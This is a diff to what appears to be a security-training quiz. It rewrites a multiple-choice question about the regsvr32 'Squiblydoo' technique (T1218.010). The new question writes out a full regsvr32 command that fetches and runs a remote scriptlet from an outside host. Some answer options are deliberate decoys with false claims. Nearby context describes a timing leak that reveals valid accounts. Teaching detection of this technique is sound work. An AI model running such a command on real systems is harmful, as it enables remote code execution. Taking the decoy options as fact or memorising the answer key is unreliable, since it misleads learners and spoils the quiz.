@@ -447,15 +447,15 @@ const edgeCaseRoom = {
         "    user_not_exists -> ~94ms avg  (early return, no lookup)\n" +
         "  Variance itself leaks which of the 212 emails are valid accounts.",
       checkpoint: {
-        question: "According to the reading, what is the name given to the regsvr32 technique that loads a remote script via scrobj.dll?",
+        question: "A workstation runs `regsvr32 /s /n /u /i:http://cdn-updates.net/x.sct scrobj.dll`, and an outbound connection follows immediately. According to the reading, what is this?",
         options: [
-          "Squiblydoo",
-          "Living-off-the-Land",
-          "Dependency confusion",
-          "Business logic abuse",
+          "Squiblydoo (T1218.010) — regsvr32 loading a remote scriptlet through scrobj.dll",
+          "A routine local DLL registration, which is what the /i: switch with an http:// path performs",
+          "Dependency confusion — the reading's name for regsvr32 fetching a script from an external host",
+          "Business-logic abuse, the reading's category for signed Windows binaries used to download files",
         ],
         answer: 0,
-        explanation: "The reading names this specific regsvr32/scrobj.dll remote-scriptlet technique 'Squiblydoo' (T1218.010), distinguishing it from a legitimate local DLL registration that makes no outbound connection.",
+        explanation: "The reading names this specific regsvr32/scrobj.dll remote-scriptlet technique 'Squiblydoo' (T1218.010), distinguishing it from a legitimate local DLL registration — which uses a local file path and makes no outbound connection.",
       },
     },
 
